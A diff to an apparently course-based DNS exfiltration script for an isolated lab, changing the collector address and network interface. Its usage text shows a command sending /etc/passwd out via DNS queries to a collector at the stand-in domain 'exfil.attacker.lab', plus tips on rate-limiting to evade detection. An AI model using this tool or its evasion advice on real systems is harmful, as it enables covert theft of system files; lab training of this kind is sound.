@@ -19,7 +19,7 @@ Usage:
   sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/received.txt
 
   # On target (or attacker for demo):
-  sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 10.0.0.1
+  sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 192.168.56.1
 
 Detection evasion:
   - Use --delay to rate-limit queries (stay under 10 DNS/min baseline)
@@ -37,6 +37,7 @@ import time
 from scapy.all import IP, UDP, DNS, DNSQR, send, conf
 
 conf.verb = 0
+conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)
 
 EXFIL_DOMAIN = "exfil.attacker.lab"
 CHUNK_SIZE   = 32    # base32 characters per chunk (stays within DNS label 63-char limit)
